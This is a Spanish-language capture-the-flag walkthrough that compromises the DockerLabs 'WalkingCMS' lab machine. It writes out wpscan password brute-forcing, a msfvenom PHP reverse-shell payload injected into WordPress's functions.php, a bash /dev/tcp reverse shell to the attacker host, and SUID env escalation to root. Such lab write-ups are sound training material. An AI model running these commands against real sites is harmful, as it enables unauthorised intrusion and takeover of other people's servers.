Lo primero que tenemos que hacer, es ir a la pagina de "dockerlabs.es" y bajarnos la maquina "WalkingCMS".
Una vez hecho y COMO SIEMPRE, descomprimimos el archivo, e inicializamos la maquina con el comando:
```
sudo bash auto_deploy.sh walkingcms.tar
```
Lo primero de todo, tras desplegarse la maquina, es hacer un NMAP. No necesitamos hacer un ARP-SCAN (o NETDISCOVER), porque ya sabemos la IP de la maquina victima.
```
nmap -p- --open -sCV -sS --min-rate 5000 172.18.0.2 -n -Pn -vvv
```
Una vez terminado, vemos que tiene un unico puerto abierto:
```
Discovered open port 80/tcp on 172.18.0.2
```
En este caso, empezaremos poniendo en el navegador esta IP y ver si en la pagina, existe alguna informacion "util".
Pero unicamente vemos una pagina de Apache2 normal.
Por lo tanto, vamos a probar a hacer un poco de FUZZING WEB a ver si hay suerte:
```
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,html
```
El resultado de pasar GOBUSTER es:
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10701]
/wordpress            (Status: 301) [Size: 312] [--> http://172.17.0.2/wordpress/]                                                                      
Progress: 143724 / 830576 (17.30%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 144102 / 830576 (17.35%)
===============================================================
Finished
===============================================================
```
Vemos que hay un Wordpress instalado, asi que vamos a ver si hay algun panel de login. No obstante, yo prefiero volver a usar GOBUSTER sobre el directorio "/wordpress":
```
gobuster dir -u http://172.17.0.2/wordpress/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,html
```
Obteniendo lo siguiente:
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.php            (Status: 301) [Size: 0] [--> http://172.17.0.2/wordpress/]                                                                        
/wp-content           (Status: 301) [Size: 323] [--> http://172.17.0.2/wordpress/wp-content/]                                                           
/wp-includes          (Status: 301) [Size: 324] [--> http://172.17.0.2/wordpress/wp-includes/]                                                          
/wp-login.php         (Status: 200) [Size: 6580]
/readme.html          (Status: 200) [Size: 7401]
/wp-trackback.php     (Status: 200) [Size: 136]
/wp-admin             (Status: 301) [Size: 321] [--> http://172.17.0.2/wordpress/wp-admin/]                                                             
/xmlrpc.php           (Status: 405) [Size: 42]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://172.17.0.2/wordpress/wp-login.php?action=register]                                            
Progress: 830572 / 830576 (100.00%)
===============================================================
Finished
===============================================================
```
Tal y como se puede ver (aunque nos lo imaginaramos antes de usar GOBUSTER esta segunda vez), hay un "wp-login.php", por lo que iremos al navegador y entraremos en la direccion: "172.17.0.2/wordpress/wp-login.php". Aqui veremos un bonito panel de Login (logicamente) de Wordpress.
Es momento ahora de usar una herramienta especifica para intentar encontrar primero usuarios dentro de entornos CMS como este, que se llama WPSCAN. En la terminal podremos:
```
wpscan --url http://172.17.0.2/wordpress/ --enumerate u,vp
```
Y vemos que nos encuentra un usuario llamado "mario":
```
[i] User(s) Identified:

[+] mario  <==== Usuario detectado "mario"
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://172.17.0.2/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```
Perfecto. Ya tenemos el usuario, pero... ¿y la contraseña? Bien, para encontrarla, aunque hay otras herramientas, usaremos de nuevo WPSCAN ya que esta mas indicada para CMS's:
```
wpscan --url http://172.17.0.2/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames mario
```
Y nos encuentra la contraseña "love", como se puede ver a continuacion:
```
[!] Valid Combinations Found:
 | Username: mario, Password: love
```
**NOTA: Antes de continuar, hay que decir que al usar WPSCAN, se pone la ruta donde se encuentra el panel de Login PERO sin el "wp-login.php" (OJO CON ESTO !! ES MUY IMPORTANTE)**

Una vez encontrada la contraseña y aclarado lo anterior, pasamos a introducir las credenciales en el panel de login, lo que nos da acceso al panel de control de Wordpress del usuario "mario".
Bien, ahora nos interesaria inyectar codigo malicioso en ".php" pero no se observa ningun apartado donde poder subir algun archivo, por lo que otra alternativa es intentar inyectar el codigo malicioso directamente.
Lo primero que haremos sera abrir una terminal y  crear directamente el codigo malicioso con "msfvenom". Vamos a intentar obtener una reverse, por lo que usaremos:
```
msfvenom -p php/reverse_php LHOST=172.17.0.1 LPORT=443 -f raw > reverseWalkingCMS.php
```
ya con el codigo malicioso creado, lo que haremos sera copiar al portapapeles TODO el contenido del archivo "reverseWalkingCMS.php".
Ahora nos dirigiremos de nuevo al navegador, y concretamente, al panel de control del usuario "mario", donde estabamos antes.
En este panel de control seleccionaremos en el menu de la izquierda la opcion "Apariencia", y dentro de ella, elegiremos donde pone "Theme Code Editor".
Perfecto, ahora es momento de inyectar nuestro codigo. Para ello, en la parte de la derecha, veremos un archivo que se llama "functions.php", por ejemplo.
Lo que haremos es simplemente abrir ese archivo y borrar todo su contenido, sustituyendolo por nuestro codigo malicioso.
Antes de continuar y grabar el archivo, abriremos DOS ventanas de la terminal:
	1) Una la pondremos a la escucha por el puerto 443 (el del codigo malicioso).
	2) La segunda, la pondremos a la escucha por el puerto 444, por ejemplo.
¿Y por que hacemos esto? Lo explico:
Cuando se hace un "payload" o codigo malicioso con "msfvenom" en PHP, normalmente al de unos segundos/minutos nos expulsa de la maquina, por lo que es conveniente siempre estabilizar esa conexion que obtenemos con el "payload".
La forma mas sencilla de estabilizarla es abrir una segunda terminal (como acabamos de hacer) e ir a la pagina "revshells.com".
En esta pagina, meteremos nuestra IP y el puerto que hemos elegido en la segunda terminal, es decir, el puerto al que queramos "redirigir" la conexion obtenida con el "payload".
Una vez hecho, en la parte de abajo, por defecto, nos proporcionara una reverse. En este caso en concreto:
```
sh -i >& /dev/tcp/172.17.0.1/444 0>&1
```
Esta reverse, sera la que meteremos luego en la primera terminal para estabilizar la conexion.
Bien, aclarado todo esto, volvemos al navegador y a nuestro panel de control de Wordpress.
Si recordadmos habiamos sustituido ya el codigo original de "functions.php" por nuestro "payload". Ahora ya solo tenemos que pinchar sobre el boton azul que pone "Update File" y esperar a que nos confirme Wordpress que se ha guardado correctamente.
En mi caso, simplemente con hacer esto ya me ha cogido directamente la conexion por el puerto 443, pero si vemos que no lo hace, iremos al navegador, pondremos la direccion "172.17.0.1/wordpress/" (por ejemplo) y ya deberia hacerlo.
Bien, ¿y ahora que? Pues como hemos dicho, hay que estabilizar la conexion antes de que nos "eche", por lo que introduciremos en ese primer terminal (el del puerto 443) el siguiente comando:
```
bash -c "sh -i >& /dev/tcp/172.17.0.1/444 0>&1"
```
Lo que nos mandara la "reverse" a nuestra segunda terminal (la del puerto 444) y asi tendremos la conexion estabilizada. Ahora ya podriamos cerrar la primera terminal ya que no la necesitamos mas.
Bien, volviendo a la segunda terminal y escribiendo "whoami" vemos lo siguiente:
```
$ whoami
www-data
$ 
```
Nos quedarian ya solo dos cositas por hacer: el tratamiento de la TTY y la escalada de privilegios.
Empezaremos por el tratamiento de la TTY. Para ello haremos lo siguiente:
```
1) Escribimos:
	script /dev/null -c bash
2) Ahora pulsamos (CTRL + Z) y nos devuele a la terminal de la maquina atacante
3) Escribimos:
	stty raw -echo; fg
4) Una vez escrito lo anterior y vuelto a la maquina victima, escribimos:
	reset xterm
5) Finalmente, escribimos estos dos comandos:                    
    export TERM=xterm
    export SHELL=bash
6) Nos quedaria la terminal de la siguiente forma:
	www-data@92f4b9a90f9f:/var/www/html/wordpress/wp-admin$
```
Vale, finalizado el tratamiento de la TTY, pasaremos a la escalada de privilegios probando primero con el comando "sudo -l":
```
bash: sudo: command not found
```
Como se ve, no se puede continuar por ahi. Es momento ahora de probar otro tipo de escalada de privilegios con el comando: "find / -perm -4000 2>/dev/null":
```
find / -perm -4000 2>/dev/null

/usr/bin/chsh
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/env
/usr/bin/newgrp
www-data@92f4b9a90f9f:/var/www/html/wordpress/wp-admin$
```
Una vez obtenida la lista de binarios con permisos "SUID", iremos a la pagina de "gtfobins" y buscaremos cada uno de ellos para ver si podemos utilizarlos.
En este caso, el que funcionaria seria "/usr/bin/env", por lo que en "gtfobins" veremos que "env">SUID, nos presenta el siguiente codigo para hacer una reverse:
```
./env /bin/sh -p
```
No obstante, en nuestro caso pondremos la ruta COMPLETA:
```
www-data@92f4b9a90f9f:/var/www/html/wordpress/wp-admin$ /usr/bin/env /bin/sh -p
# whoami
root
# 
```
Finalmente vemos que hemos tenido acceso "root" en la maquina.
Como opcional, podriamos escribir el comando "bash -p" para obtener un prompt algo mas "normal", tal y como se ve abajo.
```
# bash -p
bash-5.2# whoami
root
bash-5.2#
```
